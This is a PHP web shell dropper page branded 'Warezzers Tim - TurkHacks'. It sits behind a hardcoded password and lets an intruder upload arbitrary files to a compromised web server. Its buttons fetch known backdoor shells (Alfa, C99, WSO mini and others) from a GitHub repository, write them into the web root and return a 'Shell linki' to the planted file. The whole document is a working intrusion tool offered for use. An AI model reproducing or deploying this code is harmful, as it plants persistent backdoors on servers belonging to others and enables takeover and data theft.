<!DOCTYPE html>
<html>
<head>
    <style>
        /* POEİCE UPLOAD SHELL */
        @keyframes glitch {
            0% { transform: none; }
            20% { transform: translate(-1px, -1px); }
            40% { transform: translate(1px, 1px); }
            60% { transform: translate(-1px, 1px); }
            80% { transform: translate(1px, -1px); }
            100% { transform: none; }
        }
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            margin: 0;
            padding: 0;
        }
        .upload-form {
            background-color: #111;
            width: 90%;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #0f0;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        .upload-form h2 {
            text-align: center;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .upload-form p {
            color: #0f0;
            text-shadow: 0 0 3px #0f0;
        }
        .upload-form input[type="file"],
        .upload-form input[type="text"] {
            margin-bottom: 10px;
            background-color: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 5px;
            border-radius: 5px;
            width: 100%;
        }
        .upload-form input[type="submit"] {
            background-color: #f00;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            animation: glitch 0.2s infinite alternate;
            width: 100%;
        }
        .upload-form input[type="submit"]:hover {
            background-color: #ff4444;
        }
        .message {
            text-align: center;
            margin-top: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .message a {
            color: #00f;
            text-decoration: none;
        }
        .message a:hover {
            text-decoration: underline;
        }
        .hack-buttons {
            text-align: center;
            margin-top: 20px;
        }
        .hack-button {
            background-color: #f00;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 5px;
            animation: glitch 0.2s infinite alternate;
            width: 100%;
        }
        .hack-button:hover {
            background-color: #ff4444;
        }
        .poeice {
            text-align: center;
            margin-top: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
            animation: glitch 0.2s infinite alternate;
        }
        body {
            position: relative;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: #000 url(https://www.turkhacks.com/styles/darkgreen/bg.gif);
        }
        .responsive-img {
            width: 90%;
            max-width: 400px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        /* Mobil uyumluluk için medya sorguları */
        @media (max-width: 600px) {
            .upload-form {
                width: 100%;
                padding: 10px;
            }
            .upload-form input[type="submit"] {
                padding: 10px;
            }
            .hack-button {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <?php
    session_start();
    $password = "warezzerstim2024";

    if (!isset($_SESSION['authenticated'])) {
        if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["password"])) {
            if ($_POST["password"] === $password) {
                $_SESSION['authenticated'] = true;
            } else {
                echo "<div class='message'>Yanlış şifre. Tekrar deneyin.</div>";
            }
        }
    }

    if (!isset($_SESSION['authenticated'])) {
        ?>
        <div class="upload-form">
            <h2>Giriş Yap</h2>
            <form method="POST">
                <p>Lütfen şifreyi giriniz:</p>
                <input type="password" name="password" placeholder="Şifre">
                <input type="submit" value="Giriş Yap">
            </form>
        </div>
        <?php
    } else {
        ?>
        <div class="upload-form">
            <h2>Yükleme Formu</h2>
            <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
                <p>Bir dosya seç ve avla :)</p>
                <input type="file" name="uploaded_file" placeholder="Hedef dosya seç...">
                <input type="submit" name="file_upload_submit" value="Dosya Yükle">
                <p>veya URL girin:</p>
                <input type="text" name="file_url" placeholder="Dosya URL'si">
                <input type="submit" name="url_upload_submit" value="Link ile Dosya Yükle">
            </form>
            <div class="message">
                Warezzers Tim - TurkHacks
            </div>
            <div class="hack-buttons">
                <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
                <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
                <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/3.php')">C99 Yükle</button>
                <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/4.php')">WsoMini Yükle</button>
                <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
                <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
            </div>
        </div>
        <br>
        <img src="https://i.hizliresim.com/920h03s.png" class="responsive-img" alt="Image">
        <script>
            function uploadFile(url) {
                // Form öğesini al
                var form = document.querySelector('.upload');

                // URL değerini içeren gizli bir input alanı ekleyin
                var urlInput = document.createElement('input');
                urlInput.type = 'hidden';
                urlInput.name = 'file_url';
                urlInput.value = url;
                form.appendChild(urlInput);

                // Formu gönder
                form.submit();
            }
        </script>
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            if (isset($_POST['url_upload_submit']) && isset($_POST["file_url"])) {
                $url = $_POST["file_url"];
                $fileContent = file_get_contents($url);
                if ($fileContent !== false) {
                    $fileName = basename($url);
                    $uploadDirectory = "";
                    if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
                        echo "<div class='message'>Dosya başarıyla yüklendi. Shell linki: <a href='$uploadDirectory$fileName' target='_blank'>$uploadDirectory$fileName</a></div>";
                    } else {
                        echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
                    }
                } else {
                    echo "<div class='message'>Dosya indirilirken bir hata oluştu!</div>";
                }
            } else {
                if (!empty($_FILES['uploaded_file'])) {
                    $uploadKlasoru = "";
                    $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
                    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
                        echo "<div class='message'>Dosya " . basename($_FILES['uploaded_file']['name']) . " başarıyla hacklendi. <a href='$dosyaYolu' target='_blank'>Dosyayı Aç</a></div>";
                    } else {
                        echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
                    }
                }
            }
        }
    }
    ?>
</body>
</html>